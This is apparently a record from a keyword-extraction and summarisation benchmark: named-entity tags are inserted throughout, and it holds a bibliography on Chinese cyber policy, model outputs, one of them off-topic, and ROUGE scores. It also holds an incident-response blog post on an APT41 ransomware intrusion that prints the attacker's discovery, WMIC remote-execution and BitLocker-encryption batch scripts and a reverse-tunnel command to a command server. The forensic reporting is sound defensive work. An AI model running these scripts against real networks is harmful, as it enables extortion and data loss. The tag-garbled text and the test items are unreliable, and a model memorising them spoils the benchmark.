[DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016.<url Florence . \u2018 Information management and internet regulation in [GPE] China . \u2019 [GPE] China 's Expanding Cyberspace ( [DATE] 2014 ): pp . [DATE] 11 [DATE] - [DATE] 13 . < url [PERSON] David [PERSON] E. , and [PERSON] Nicole [PERSON] Perlroth . \u2018 N.S.A. Breached Chinese Servers Seen as [ORG] Security [ORG] Threat . \u2019 The New YorkTimes . [CARDINAL] 22 Mar. [DATE] 2014 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url breached-chinese-servers-seen-as-spy-peril.html?_r=0>.Segal , Adam . \u2018 China Moves Forward on Cybersecurity Policy . \u2019 Council on Foreign Relations . [DATE] 24 [DATE] July [DATE] 2012 . Accessed22 [DATE] Aug. [DATE] 2016 . < url Adam . \u2018 The Deepening Divide in [ORG] U.S.-China [ORG] Cyber [ORG] Relations . \u2019 [ORG] The [ORG] National [ORG] Interest . [CARDINAL] 29 [DATE] Oct. [DATE] 2014 . [DATE] Accessed18 [DATE] Aug. [DATE] 2016 . < url 11568>.32Segal , Adam . \u2018 What to Do About [GPE] China \u2019s [EVENT] New [EVENT] Cybersecurity [EVENT] Regulations ? \u2019 Council on Foreign Relations . [CARDINAL] 2 Feb.2015 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url cybersecurity - regulations/>.Sisi , [PERSON] Wei , and [PERSON] Qiu [PERSON] Wei . \u2018 [GPE] China \u2019s Internet Censors Have a Choral Anthem and It 's Everything You Want It toBe . \u2019 [ORG] Quartz . [DATE] 16 [DATE] Feb. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url choral - anthem - and - its - everything - you - want - it - to - be/>.Stark , [GPE] Jill . \u2018 [GPE] US [ORG] Follows [ORG] Australia in [FAC] Naming [FAC] Huawei as a Possible Security Threat . \u2019 The Sydney Morning Herald . [CARDINAL] 9 Oct.2012 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url huawei - as - a - possible - security - threat-20121007 - 277ad.html>.Stevens , [PERSON] Tim . \u2018 Breaching Protocol : [WORK_OF_ART] The [WORK_OF_ART] Threat [WORK_OF_ART] of [WORK_OF_ART] Cyberespionage.\u2019Academia.edu . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016.<url [PERSON] Timothy [PERSON] L. [PERSON] \u2018 [PERSON] Information [PERSON] Security [PERSON] Thinking : A Comparison of [GPE] U.S. , [NORP] Russian , And Chinese Concepts . \u2019 ForeignMilitary Studies Office Publications . [DATE] July [DATE] 2001 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url [FAC] Shannon . \u2018 [GPE] China ( Finally ) Admits to Hacking . \u2019 The Diplomat . [CARDINAL] 18 Mar. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016.<url [FAC] Shannon . \u2018 [GPE] US Indicts [CARDINAL] 5 PLA Officers For Hacking , Economic Espionage . \u2019 The Diplomat . [CARDINAL] 20 May 2014.Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url [PERSON] espionage/>.Wang [PERSON] Yukai , \u2018 Zhongyang wangluo anquan yu xinxihua lingdao xiaozu de youlai ji qi yinxiang ( The Origins andInfluence of [ORG] the [ORG] Central [ORG] Network [ORG] Security and [ORG] Informatization [ORG] Leading [ORG] Small [ORG] Group ) , [PERSON] \u2019 [PERSON] Zhongguo [PERSON] Gongchandang [PERSON] Xinwen [PERSON] Wang ( [ORG] Communist [ORG] Party [ORG] of [ORG] China [ORG] News [ORG] Network ) , [CARDINAL] 3 Mar. [DATE] 2014 . url people.com.cn/n/2014/0303/c40531-24510897.html > , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 16.Xue Ruihan , \u2018 [PERSON] Jianli jianqian guojia wangluo he xinxi anquan chang xiao jizhi ( [NORP] Establish and improve the national network and information security long - term mechanisms ) , \u2019 [PERSON] Renmin [PERSON] Wang ( People \u2019s [ORG] Daily [ORG] Online ) , [CARDINAL] 17 Apr. [DATE] 2014 , < url [CARDINAL] 24909496.html > , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 17.Yao , [PERSON] Jianing . \u2018 PLA Cyberspace Strategic Intelligence Research Center Founded . \u2019 [GPE] China 's Military . [DATE] 30 [DATE] June 2014.Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url 06/30 / content_6025789.htm>.Ying , [PERSON] Yu [PERSON] Lin . \u2019 The Implications of China 's Military Reforms . \u2019 The Diplomat . 7 Mar. [DATE] 2016 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016.<url [PERSON] Rui . \u2018 China Headlines : [PERSON] Xi [PERSON] Slams [PERSON] ' double Standards , ' Advocates Shared Future in [PERSON] Cyberspace . \u2019 CCTV.COM . [DATE] 17Dec . [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [ORG] Ningzhu . \u2018 Xi Jinping Leads Internet Security Group . \u2019 Xinhuanet . [DATE] 27 [DATE] Feb. [DATE] 2014 . Accessed [CARDINAL] 22 [DATE] Aug. [DATE] 2016.<url [PERSON] Yishi . \u2018 Hackers Find Holes Behind [ORG] the [ORG] Great [ORG] Firewall . \u2019 Hackers Find Holes Behind [ORG] the [ORG] Great [ORG] Firewall . [QUANTITY] 21 [QUANTITY] Jan.2012 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url ( Operations ) Department of the General Staff DepartmentSecond ( [ORG] Intelligence ) [ORG] Department [ORG] of the General Staff DepartmentThird ( Technical ) Department of the General Staff [PERSON] DepartmentFourth ( Electronic Countermeasures and Radar ) Department of the General Staff [ORG] DepartmentCyberspace [ORG] Administration of [ORG] ChinaCLSGISICentral [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security and InformatisationCNAcomputer network attackCNCERTNational [ORG] Computer [ORG] Network [ORG] Emergency [ORG] Response [ORG] Technical Team / [ORG] Coordination [ORG] Center of ChinaCNDCNEcomputer network defencecomputer network exploitationCOSTINDCommission for [ORG] Science , [ORG] Technology [ORG] and [ORG] Industry [ORG] for [ORG] National [ORG] DefenseDoDECMGSDICANNICTMIITMPSMSSNPONSAPLADepartment [ORG] of [ORG] Defense [ORG] of [ORG] the [ORG] United [ORG] Stateselectronic countermeasuresPeople \u2019s [ORG] Liberation [ORG] Army General Staff DepartmentInternet Corporation for Assigned Names and Numbersinformation and communications technologyMinistry of [ORG] Industry [ORG] and [ORG] Information [ORG] TechnologyMinistry [ORG] of [ORG] Public [ORG] SecurityMinistry of State SecurityNew Policy OpinionNational Security Agency of [ORG] the [ORG] United StatesPeople \u2019s [ORG] Liberation [ORG] ArmySASTINDState [ORG] Administration [ORG] for [ORG] Science , [ORG] Technology [ORG] and [ORG] Industry [ORG] for [ORG] National [ORG] DefenceSCIOSCOSIGINTSIIOSILGSIPRIState [ORG] Council \u2019s [ORG] Information [ORG] OfficeShanghai Cooperation Organisationsignals intelligenceState Internet Information OfficeState Informatisation Leading GroupStockholm International Peace Research InstituteSNISCSGState Network and Information Security Coordination Small GroupSSFPeople \u2019s Liberation Army Strategic Support Force34", "generated_text": "the NATO Cooperative Cyber Defense Centre of Excellence; the Center; interdisciplinary applied research; consultation; training; exercises; cyber security; national organisational models; national cyber security governance; national incident management; coordination; national cyber security objectives; countries; the UK; the EU; the European Union; SNs; Austria; Finland; other countries; sponsorship; the Centre; world leaders; policy; strategy; a diverse group; international experts; law; strategic research; research; technology researchers; allies; 2014; the Centre; national organisational models; national cyber security strategy objectives; responsibilities; the relevant organizations; coordination; the activities; the report; the mandates; the task; tasks; responsibilities; the relevant organizations; responsibility.", "ref_text": "<START-1>The document provides an overview of China's cyber strategy, governance structure, and military cyber capabilities. Some of the main points are: - China views uncontrolled information and foreign technologies as threats to the regime. It aims to maintain political control while gaining economic benefits from the internet. - China advocates for \"cyber sovereignty\" and rejects the applicability of international law in cyberspace. It wants greater control over global internet governance. - Key civilian agencies involved in cyber policy include the Ministry of Industry and Information Technology, Ministry of Public Security, Ministry of State Security, and the Cyberspace Administration of China. - The Central Leading Small Group for Internet Security and Informatisation, chaired by Xi Jinping, was created in 2014 to coordinate cyber strategy and policy. - The People's Liberation Army has two main departments focused on cyber operations - the 3rd Department for cyber espionage and the 4th Department for cyber warfare. - In 2015, China announced the creation of the PLA Strategic Support Force which consolidates the military's space, cyber and electronic warfare capabilities. - Patriotic hacker groups in China augment state cyber capabilities but also pose risks in terms of escalating tensions and going rogue. - China engages in extensive cyber espionage against governments and companies to gain economic and strategic advantage. This is a source of tension with Western nations. - China rejects Western norms of behavior in cyberspace and advocates for a multilateral, UN-led model of internet governance that recognizes national sovereignty. In summary, China has a complex cyber governance structure aimed at controlling information, gaining economic advantage, and asserting national prerogatives in cyberspace. This brings it into conflict with Western liberal norms for the internet. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.314214463840399, "gpt3/lexical/rouge_rouge2": 0.030075187969924814, "gpt3/lexical/rouge_rougeL": 0.16458852867830426, "gpt3/lexical/rouge_rougeLsum": 0.16458852867830426, "gpt3_generated_text": ["The NATO Cooperative Cyber Defence Centre of Excellence, also known as the Centre, is a hub for interdisciplinary applied research, consultation, training, and exercises in the field of cyber security. It brings together a diverse group of international experts from military, government, and industry backgrounds to address cyber security challenges. The Centre works with countries such as the UK and the EU to develop national organisational models for cyber security governance, incident management, and coordination. The reports produced by the Centre outline national cyber security strategy objectives and the division of tasks and responsibilities among relevant organizations. Countries like Austria and Finland have also joined as contributing participants. Overall, the Centre plays a crucial role in shaping cyber security policies and strategies for world leaders and allies."]}, {"split_name": "test", "sample_id": "test_5", "prompt_text": "Extract the keywords: medium.com /@DCSO_CyTec / apt41 - the - spy - who - failed - to - encrypt - me-24fc0f49cad1 APT41 \u2014 The spy who failed to encrypt me [ORG] DCSO [PERSON] CyTec [PERSON] Blog \u22ee \u22ee 12/26/2022This blog post is based on our recent investigation into one of APT41 \u2019s operations against an unnamed [NORP] German company from the financial sector . The company contacted us in [DATE] March [DATE] 2022 after discovering a ransom note ( as presented below ) on several of its servers . The threat actor tried to encrypt multiple workstations in the client \u2019s environment which was thwarted by [ORG] Microsoft [ORG] Defender [ORG] for [ORG] Endpoint ( [ORG] MDE ) . As part of this incident response engagement [ORG] DCSO \u2019s Incident Response Team ( DIRT ) supported the client in determining the scope of the incident , identifying the initial attack vector and providing remediation support . Hello . All your servers are encrypted . Please contact : KalajaTomorr@ctemplar.com spare email : KalajaTomorr@firemail.cc Your identity code : * * * * * * * * * * * * Contact us to get the decryption method . You can [ORDINAL] first understand how to buy [PERSON] Bitcoin and pay . Only we can decrypt , please do not believe any decryption tool . Your recovery method will cause data to be destroyed and irreversible . During this incident response engagement [PERSON] DIRT performed a forensic analysis of multiple servers and workstations which allowed us to determine that : The initial attack vector was a vulnerable \u201c [ORG] Microsoft [ORG] Exchange [ORG] Server \u201d , that was compromised with the help of the\u201cProxyLogon \u201d exploit . The threat actor used a \u201c China Chopper \u201d web shell to persist on the compromised \u201c [ORG] Microsoft [ORG] Exchange [ORG] Server \u201d . The threat actor laterally moved from the patient [CARDINAL] zero to a domain controller after performing initial credential dumping activities . The threat actor used a [ORDINAL] second domain controller as a \u201c base \u201d to stage his encryption attack against workstations and servers in the environment . The threat actor used \u201c [WORK_OF_ART] Jetico \u2019s BestCrypt \u201d for server encryption and \u201c Microsoft Bitlocker \u201d for the encryption of workstation . The threat actor accessed compromised systems through RDP by exposing the RDP port to the internet with the help of \u201c NATBypass\u201d . [PERSON] Merry [PERSON] Xmas and a Happy [EVENT] New [EVENT] Year from , , and .Timeline1/15Simplified Timeline of Security Incident ( Timestamps in UTC)Initial [ORG] AccessThe threat actor gained initial access in [DATE] March [DATE] 2021 by exploiting a chain of vulnerabilities known as \u201c [WORK_OF_ART] ProxyLogon \u201d ( CVE-2021\u201326855 , [GPE] CVE-2021\u201327065 ) . During the forensic examination of the affected system , [ORG] DIRT found the typical signs of \u201c [WORK_OF_ART] ProxyLogon \u201d exploitation , which are the execution of the PowerShell Cmdlets Set - OabVirtualDirectory , Remove - OabVirtualDirectory and New-2/15OabVirtualDirectory . Those events were retrieved from [ORG] the [ORG] MSExchange [ORG] Management [ORG] log [ORG] ( Event ID 1 ) . By exploiting the \u201c [WORK_OF_ART] ProxyLogon \u201d vulnerability the threat actor was able to drop a \u201c China Chopper \u201d web shell supp0rt.aspx on the client \u2019s exchange server : The contents of the web shell are presented below : [ORDINAL] Second AppearanceAfter a year of inactivity the threat actor returned in [DATE] March [DATE] 2022 to further penetrate into the compromised network . In the meanwhile , the client \u2019s [PERSON] Exchange [PERSON] Server has been fully patched . Unfortunately , the client forgot to remove the already existing web shell before applying security patches which enabled the threat actor to return [DATE] a [DATE] year [DATE] later . The [ORDINAL] first post - exploitation activity that the threat actor conducted on the compromised Exchange Server was to upload SysInternal \u2019s \u201c Procdump \u201d ( procdump64.exe ) and \u201c [WORK_OF_ART] NATBypass \u201d ( [PERSON] na.exe ) to the staging directory aspnet_client . Shortly after completing the upload the threat actor used \u201c Procdump \u201d to perform credential dumping activities . [ORG] DIRT found a corresponding [ORG] Amcache entry that proves the execution of \u201c Procdump \u201d . Additionally , the registry key EulaAccepted was set on the [ORG] Exchange server which is an indicator of the usage of SysInternal \u2019s \u201c Procdump\u201d . [CARDINAL] One interesting detail to note about the tool uploads is that certain tools like for example \u201c [WORK_OF_ART] NATBypass \u201d ( [PERSON] na.exe ) were uploaded in cabinet archives . This behavior was repeated during the discovery stage of the attack in which the threat actor collected the outputs of his discovery scripts in cabinet archives . $ file nana : [ORG] Microsoft [ORG] Cabinet archive , Windows /XP setup , bytes , file , at + A , number , datablocks , compressionPrivilege EscalationAs described in the section \u201c [WORK_OF_ART] Initial [WORK_OF_ART] Access \u201d , the patient [CARDINAL] zero system showed signs of \u201c [WORK_OF_ART] ProxyLogon \u201d exploitation . In fact [ORG] DIRT was able to confirm the exploitation by reviewing the exchange server logs of the affected system . \u201cProxyLogon \u201d allows the attacker to drop a web shell into a publicly accessible web path of a vulnerable [ORG] Exchange server that subsequently serves as persistent backdoor . Additionally , the web shell is executed with the privileges of the account used to run the application pool of the IIS server . By default this is NT Authority\\SYSTEM , which was also the case for our client . Therefore , by exploiting \u201c [WORK_OF_ART] ProxyLogon \u201d to drop a web shell , the attacker can easily gain SYSTEM privileges and achieve persistence on the target system . Defensive EvasionThe threat actor did n\u2019t use any sophisticated techniques to avoid detection or to bypass security products . But sometimes simplicity can be the ultimate sophistication . DIRT observed that the threat actor relied on [CARDINAL] three types of tools : Already present tools , custom tools and commercial off - the - shelf tools . Additionally , the threat actor showed some routine in deleting his tools in order to hinder forensic [CARDINAL] analysis.3/15One thing that [ORG] DIRT observed was that the batch - scripts used by the threat actor always contained a line of code to delete the batch script itself and it \u2019s outputs : : * * * . * * Another technique that was observed by [ORG] DIRT during this intrusion is falling into the category of \u201c [WORK_OF_ART] Living [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Land \u201d in which the threat actor leverages already existing tools present in the target environment . In this case the threat actor leveraged [ORG] Microsoft [ORG] BitLocker to for the encryption of workstations . This approach provides the benefit that no development costs need to be spend on custom ransomware , instead the already present [PERSON] Microsft [PERSON] BitLocker is used to achieve encryption . Furthermore , the usage of [ORG] Microsoft [ORG] BitLocker is not unusual in corporate environments which makes detection more challenging . In addition to living - of - the - land tools , the threat actor used commercial , off - the - shelf encryption software [PERSON] Jetico [PERSON] BestCrypt for server encryption purposes . One might argue that using this software ( which is digital signed by \u201c [ORG] Jetico [ORG] Inc. [ORG] Oy \u201d ) allowed the threat actor to stay under the radar . From a threat actors perspective commercial , off - the - shelf encryption software like [ORG] Jetico [ORG] BestCrypt has the potential to be misused as ransomware that is digital signed and trusted by anti - virus vendors . Credential [ORG] AccessThe [ORDINAL] first post - exploitation activities that the threat actor performed after compromising the patient [CARDINAL] zero system was to upload several tools like for example \u201c Procdump \u201d and \u201c [WORK_OF_ART] NATBypass \u201d to the staging directory aspnet_client . Next the threat actor used \u201c Procdump \u201d to create a memory dump of the LSASS process . [ORG] DIRT found a corresponding [ORG] Amcache entry that proves the the execution of \u201c Procdump \u201d . In addition to that the registry key EulaAccepted was set which is related to the usage of the argument -accepteula which was supplied during the execution of procdump64.exe . Forensic Artifacts \u2014 Credential AccessLast but not least [ORG] DIRT found forensic evidence of execution that shows that the threat actor used a tool called C:\\PerfLogs\\secretsdump.exe on [CARDINAL] one of the domain controllers in the compromised4/15environment . By looking up the hash on [ORG] VirusTotal we were able to confirm that [ORG] secretsdump.exe is the \u201c [WORK_OF_ART] PyInstaller \u201d version of Impacket \u2019s secretsdump.py . The threat actor leveraged the tool to create a [ORG] LSA secerts dump hashes.txt and store its contents in the staging directory C:\\PerfLogs\\.The credential access activities performed by the threat actor resulted in the exposure of the credentials of [CARDINAL] two domain administrator accounts from different domains within the client \u2019s active directory forest . Those credentials were subsequently used for lateral movement purposes . [PERSON] DiscoveryDIRT observed that during the post - exploitation stage of the attack the threat actor conducted extensive discovery activities , that were aimed at identifying suitable targets for encryption purposes . The following code listing shows the contents of the batch script C:\\PerfLogs\\cmd - webshell.txt which was obtained from a compromised domain controller . @ off [PERCENT] dir1=\\perflogs [PERCENT] % dir1 % % dir1%del * .txt & del * .net time /domain > % dir1%\\info.txt > > % dir1%\\info.txtipconfig /all > > % dir1%\\info.txtnet group /domain>>%dir1%\\info.txtdsquery server > > % dir1%\\info.txtnltest /domain_trusts /all_trusts > > % dir1%\\info.txtwmic /namespace:\\\\root\\securitycenter2 dir1 antivirusproduct get displayname , productstate , dir1tosignedreportingexe>>%dir1%\\info.txtdsquery * - 0 - filter -attr cn operatingSystem description > > % dir1%\\computers.txtfindstr -c : computers.txt > server.txtfindstr -c : computers.txt > Win10.txt /f [PERCENT] % [PERCENT] % a ( server.txt ) % % a>>ip.txtp.exe & rename o.txt Server-ping.txt & del ip.txt /f [PERCENT] % [PERCENT] % a ( Win10.txt ) % % a>>ip.txtp.exe & rename o.txt Win10-ping.txt & del ip.txtdel p.exe & del server.txt & del Win10.txtfind /i /c Win10-ping.txtfind /i /c Server- ping.txtfindstr /c : info.txt computers.txt > list.txt & info.txt>>list.txt & Server- ping.txt>>list.txt & Win10 - ping.txt>>list.txtmakecab /f list.txt /d maxdisksize=1001024000 del * .txt & del * .bat & del * .&del setup.*&del * .batThe script runs multiple tools / commands to gather information about the compromised system and it \u2019s environment . Most of the commands are built - in tools shipped with [ORG] Microsoft [PRODUCT] Windows . But there is [CARDINAL] one exception , a tool named p.exe . This custom tool is known as \u201c MiPing \u201d . It can be described as a threaded \u201c pinger \u201d used to discover active systems within the compromised environment . It takes a list of [ORG] IP addresses in the form of a text file named [ORG] ip.txt and then returns a file named o.txt that contains information about the availability of the systems previously specified in the text file [ORG] ip.txt . \u201c MiPing \u201d was [ORDINAL] first discovered by [ORG] LIFARS and described in their report \u201c \u201d . The report links \u201c MiPing \u201d to an intrusion conducted by [GPE] APT41 . The investigation results led to a criminal indictment of [CARDINAL] seven defendants by [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Justice . Another notable detail about the discovery script is that it distinguishes between workstations ( Win10- ping.txt ) and servers ( Server-ping.txt ) . This distinction is relevant because the threat actor uses a different encryption technique depending on whether the target system is a workstation or server . DIRT observed that the threat actor used \u201c Jetico BestCrypt \u201d for the encryption of servers and \u201c [ORG] Microsoft [ORG] BitLocker \u201d for the encryption of workstations . This observation was also made by SYNACKTIV in their \u201c \u201d blog post which details a similar intrusion.5/15After the execution of all discovery commands their outputs are stored in individual text files , which then are combined into a single text file called [GPE] C:\\PerfLogs\\list.txt . In the end the single text file gets archived with the makecab.exeutility . This collection behavior was also observed by Cybereason \u2019s Incident Response Team as described in their blog post \u201c \u201d .A final thing to note is that at times the threat actor executed the discovery commands presented in the script manually , which failed on multiple occasions because of typos . During the forensic analysis [ORG] DIRT examined the RDP Bitmap Cache belonging to [CARDINAL] one of the compromised domain administrator accounts and the following execution of nltest.exe was spotted : [ORG] RDP [ORG] Bitmap [ORG] Cache \u2014 Manual Discovery ActivitiesLateral MovementAfter compromising the patient [CARDINAL] zero system ( [ORG] Exchange server ) the threat actor moved laterally to a neighboring domain controller ( DCs ) by leveraging [ORG] the [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) and the previously dumped domain administrator credentials . Subsequently , the compromised DCs were used as a \u201c base \u201d to initiate encryption activities on workstations and servers in the environment . The threat actor used network shares and [ORG] the [ORG] Server [ORG] Message [ORG] Block ( SMB ) protocol to copy batch scripts to target systems and then execute them through [ORG] Windows [ORG] Management [ORG] Instrumentation ( WMI ) . The following listing shows an abstraction of the techniques leveraged by the threat actor : T1021.002 : copy \\\\[TARGET]\\c$\\ /yT1021.003 : /f [PERCENT] % [PERCENT] % y ( [ TARGETS ] ) wmic /failfast:10000 /node : /USER : /PASSWORD : process call createCollectionThe threat actor performed collection activities with the help of a built - in [ORG] Microsoft [PRODUCT] Windows tool named makecab.exe . This tool is used to create cabinet archives . During our investigation we found evidence for the usage of makecab.exe and the execution of the following command line : T1560.001 : makecab /f < SOMEFILE > /d maxdisksize=1001024000The threat actor also used cabinet archives for bringing his own tools on compromised systems e.g. , the tool \u201c [WORK_OF_ART] NATBypass \u201d ( [PERSON] na.exe ) was uploaded in the form of an cabinet archive named na.6/15 $ file nana : [ORG] Microsoft [ORG] Cabinet archive , Windows /XP setup , bytes , file , at + A , number , datablocks , compressionCommand and [ORG] ControlThe threat actor accessed compromised servers directly from the internet through RDP . This was accomplished by exposing the local RDP ports of compromised systems to the internet with the help of a tool called [ORG] NATBypass ( [PERSON] na.exe ) . Since the threat actor was heavily relying on RDP for command and control , [ORG] DIRT spend some time to examine the RDP Bitmap Cache associated with the domain administrator account that was used during the intrusion . This revealed the command line below which was used to forward the local RDP port from the compromised internal server to the threat actor \u2019s command and control ( C2 ) server : [PERSON] na.exe -slave : : [ORG] NATBypass \u2014 RDP [PERSON] BitmapCacheAfter running the above command , a reverse tunnel is established from the compromised server to the on port [DATE] 10001 . This technique allows the threat actor to bypass firewall restrictions that usually prevent inbound RDP connections from the internet . The following figure summarizes the previously described technique that the threat actor used for accessing the client \u2019s domain controller through RDP:7/15NATBypass \u2014 Forwarding RDPOne interesting detail that [ORG] DIRT noticed during the forensic analysis was that each time the threat actor accessed servers through the forwarded RDP port [CARDINAL] two types of terminal service related events ( [DATE] 24 [DATE] and [DATE] 25 ) were generated on the destination systems . Those particular events all had in common that the contained originating from the previously established tunnel and therefore the RDP services logs it as a local connection . [CARDINAL] 24 0 4 0 0 0x1000000000000000 [DATE] 23324 [ORG] Microsoft - [ORG] Windows - TerminalServices- LocalSessionManager / Operational [ORG] DC.company.corp DOMAIN\\administrator [CARDINAL] 2 the system was used as a Cobalt Strike Team Server . Unfortunately , at the time of investigation the team server did n\u2019t serve Cobalt Strike beacons anymore . [ORG] DIRT spent extensive time reviewing the collected evidence to see if there were any indicators that would prove that Cobalt Strike was used during the intrusion . But no such evidence could be found.8/15Cobalt Strike Server identified by [PERSON] Twitter user @drb_raImpactDuring the forensic analysis of [CARDINAL] one of the affected domain controllers ( [GPE] DC ) in the client \u2019s environment we found that the threat actor was using the [GPE] DC as a \u201c base \u201d to launch the encryption of neighboring servers . As [PERSON] DIRT examined the [GPE] DC , a directory named [PERSON] C:\\tools\\ was found that contained a bunch of batch - scripts and the sub - directory crypt . The purpose of the batch - scripts was to perform some preparation tasks before initiating the encryption of the target systems . The code listing below shows the contents of the batch script 1.bat that was found in the mentioned directory : /f [PERCENT] % [PERCENT] % i ( address.txt ) start /b xcopy \\\\%%i\\c$\\crypt\\ /e /y /h /f [PERCENT] % [PERCENT] % i ( address.txt ) start /b copy \\\\%%i\\c$\\ /y /f [PERCENT] % [PERCENT] % i ( address.txt ) start /b copy \\\\%%i\\c$\\windows\\copys.bat /yThe script [CARDINAL] 1.bat consists of [CARDINAL] three for - loops that uses the built - in [ORG] Microsoft [PRODUCT] Windows tools copy and xcopy to move some files from the staging directory of the [GPE] DC to the encryption targets specified in the text file address.txt . The [ORDINAL] first for - loop is responsible for copying a tool named \u201c Jetico BestCrypt \u201d which is located in the directory C:\\tools\\crypt . \u201c Jetico BestCrypt \u201d is a commercial , off - the - shelf application that is able to encrypt disk volumes or individual files . APT41 has a track record of using \u201c [WORK_OF_ART] Jetico [WORK_OF_ART] BestCrypt \u201d which has been been documented by [ORG] LIFARS in their APT41 report \u201c [WORK_OF_ART] The [WORK_OF_ART] Spy [WORK_OF_ART] Who [WORK_OF_ART] Encrypted [WORK_OF_ART] Me \u201d . Throughout our investigation we noticed that the threat actor used \u201c Jetico BestCrypt \u201d exclusively for the encryption of servers . For the encryption of workstations the threat actor relied on [ORG] Microsoft [ORG] BitLocker . The purpose of the [ORDINAL] second for - loop is to copy the ransom note [ORG] Readme.txt from the staging directory on the [GPE] DC to the root of the [ORDINAL] C:\\ volume on the target servers . After the ransom note has been placed on the target servers the [ORDINAL] third for - loop copies a batch script named copys.bat to the directory C:\\Windows\\ on the9/15target server . In the following code listing the contents of the batch - script C:\\Windows\\copys.bat are presented which were obtained from [CARDINAL] one of the target servers : copy /y [ ] copy /ycopy /ycopy /y [ ] copy /ycopy /y /L % % i ( [CARDINAL] 1,1,100 ) copy /yshutdown -r -t 30 -fThe batch script copys.bat is responsible for copying the ransom note from the root of the [ORDINAL] C:\\ volume to different paths on the target server . Subsequently , the batch script copys.bat is executed with the help of another batch script named end.bat which again was located in the staging directory on the [GPE] DC . The code listing below shows the contents of end.bat : /f [PERCENT] % [PERCENT] % y ( address.txt ) wmic /failfast:10000 /node : /USER : /PASSWORD : process call createAs can be seen from the code listing above the threat actor used wmic.exe and a domain administrator account to execute the batch script copys.bat on the target servers . After transferring \u201c [WORK_OF_ART] Jetico [WORK_OF_ART] BestCrypt \u201d and a ransom note to the target system , the threat actor used RDP to connect to the servers and then execute \u201c Jetico BestCrypt \u201d to perform the encryption . The process of encrypting server systems is summarized in the following graphic:10/15Distribution of [ORG] Jetico [ORG] BestCryptAs previously mentioned the server encryption was performed in a slightly different way compared to the encryption of workstations . Instead of using \u201c [WORK_OF_ART] Jetico [WORK_OF_ART] BestCrypt \u201d the threat actor leveraged the built - in tool [ORG] Microsoft [ORG] BitLocker and a couple of batch scripts to automate the process . The code listing below shows the contents of the batch script [PERSON] C:\\WINDOWS\\test.bat , which was previously copied to the workstation from [CARDINAL] one of the DCs . The batch script is responsible for enabling [ORG] BitLocker encryption for all the volumes present in workstation . In fact the file test.bat is unique for each workstation and contains a different [ORG] BitLocker recovery password . reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\FVE /freg add /v EnableBDEWithNoTPM /t REG_DWORD /d /freg add /v UseAdvancedStartup /t REG_DWORD /d /freg add /v RecoveryKeyMessage /t REG_SZ /d /freg add /v RecoveryKeyMessageSource /t REG_DWORD /d /freg add /v RecoveryKeyUrl /t REG_SZ /d /freg add /v [PERSON] ActiveDirectoryBackup /t REG_DWORD /d /freg add /v ActiveDirectoryInfoToStore /t REG_DWORD /d /freg add /v RequireActiveDirectoryBackup /t REG_DWORD /d /fCScript //H : CScript //Smanage - bde11/15 - on A : -rp 366872\u2013032054\u2013377806\u2013330154\u2013718707\u2013337205\u2013661793\u2013443619 -UsedSpaceOnly -sk C:\\ -s [ ] manage - bde -on Z : -rp [CARDINAL] 366872\u2013032054\u2013377806\u2013330154\u2013718707\u2013337205 \u2013 [CARDINAL] 661793\u2013443619 [DATE] -UsedSpaceOnly [DATE] -sk C:\\ -sreg add /v UseTPM /t REG_DWORD /d /freg add /v [PERSON] UseTPMPIN /t REG_DWORD /d /freg add /v UseTPMKey /t REG_DWORD /d /freg add /v [GPE] UseTPMKeyPIN /t REG_DWORD /d /fmanage - bde -protectors -add C : - TPMAndStartupKey C:\\ attrib [ORG] -s -h C:\\*.BEKdel C:\\*.BEK /f /qmanage - bde -status > C:\\[IP].txtshutdown /r /t [DATE] 1800 /fdel C:\\Windows\\test.bat /f /qBesides the test.bat batch - script we found numerous other references of batch scripts in the [ORG] UsnJrnl of the [GPE] DC . [ ] The [ORDINAL] first batch script in the [ORG] UsnJrnl excerpt above is [DATE] 1.bat . It was used by the threat actor to move the batch - scripts C:\\\\bitlocker\\cmd\\[IP].bat to the directory [PERSON] C:\\WINDOWS\\test.bat on the target workstation . It \u2019s contents are presented below : /f [PERCENT] % [PERCENT] % i ( [ORG] ip.txt ) copy [PERSON] \\\\%%i\\c$\\WINDOWS\\test.bat /yAs soon as the [ IP].bat file was transferred from the [GPE] DC to all workstations in the environment the threat actor executed a batch - script named lock.bat . The purpose of lock.bat was to execute test.bat with the help of [ORG] WMIC and the previously obtained domain administrator credentials . Luckily , for the customer [PERSON] Microsoft [PERSON] Defender for Endpoint detected [PERSON] C:\\WINDOWS\\test.bat as [PERSON] Ransom : [PERSON] BAT / BLJammer . A!dha and prevented it \u2019s execution , which thwarted the encryption . /f [PERCENT] % [PERCENT] % i ( [ORG] ip.txt ) wmic /node : /USER : /PASSWORD : process call create cmd.exe /c c:\\WINDOWS\\test.batFurthermore , [ORG] DIRT found another batch - script named getstatus.bat that would have allowed the threat actor to collect a file [FAC] C:\\[IP].txt from all workstations . The file [ORG] C:\\[IP].txt contains the status of [ORG] Microsoft [ORG] BitLocker encryption upon successful execution of test.bat . /f [PERCENT] % [PERCENT] % i ( [ORG] ip.txt ) copy \\\\%%i\\C$\\%%i.txt C:\\\\bitlocker\\status\\MiPing Technical AnalysisMiPing , [ORDINAL] first described by [ORG] LIFARS in their \u201c APT41 \u2014 The Spy Who Encrypted Me \u201d paper , is a custom multi- threaded 